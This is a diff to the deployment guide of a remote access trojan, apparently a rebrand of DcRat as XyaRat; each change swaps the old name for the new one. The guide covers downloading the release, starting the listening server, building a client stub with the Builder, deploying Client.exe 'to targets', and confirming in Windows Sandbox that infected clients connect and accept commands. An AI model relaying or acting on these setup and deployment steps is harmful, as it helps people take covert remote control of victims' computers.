@@ -13,7 +13,7 @@
 Go to: https://github.com/wsxyanua/XyaRat/releases
 
 Download latest release:
-  - DcRat-[version].zip     → RAT Server + Client + Plugins
+  - XyaRat-[version].zip    → RAT Server + Client + Plugins
   - WebPanel-[version].zip  → Web Admin Panel (optional)
 
 ═══════════════════════════════════════════════════════════════════
@@ -21,8 +21,8 @@ Download latest release:
 🚀 QUICK START (Server)
 ═══════════════════════════════════════════════════════════════════
 
-1. Extract DcRat.zip to any folder
-2. Run DcRat.exe (Main Server)
+1. Extract XyaRat.zip to any folder
+2. Run XyaRat.exe (Main Server)
 3. Configure port (default: 5656)
 4. Click "Start Listening"
 5. Build client stub with "Builder" button
@@ -34,7 +34,7 @@ That's it! Server is now listening for connections.
 🔧 CLIENT DEPLOYMENT
 ═══════════════════════════════════════════════════════════════════
 
-1. Open "Builder" in DcRat.exe
+1. Open "Builder" in XyaRat.exe
 2. Configure:
    - Host: Your server IP/domain
    - Port: 5656 (default)
@@ -65,7 +65,7 @@ That's it! Server is now listening for connections.
    - Windows Features → Windows Sandbox → Enable
    
 2. Test Server (Host machine):
-   - Run DcRat.exe on host
+   - Run XyaRat.exe on host
    - Note your IP: ipconfig
    
 3. Test Client (Inside Sandbox):
@@ -74,7 +74,7 @@ That's it! Server is now listening for connections.
    - Should connect to host server
 
 4. Verify:
-   - Client appears in DcRat.exe client list
+   - Client appears in XyaRat.exe client list
    - Status: Online
    - Can send commands
 
@@ -83,8 +83,8 @@ That's it! Server is now listening for connections.
 📁 PACKAGE CONTENTS
 ═══════════════════════════════════════════════════════════════════
 
-DcRat.zip:
-  ├── DcRat.exe              ← Main Server (Run this!)
+XyaRat.zip:
+  ├── XyaRat.exe              ← Main Server (Run this!)
   ├── Stub/
   │   └── Client.exe         ← Client stub (deploy to targets)
   └── Plugin/                ← All plugin DLLs
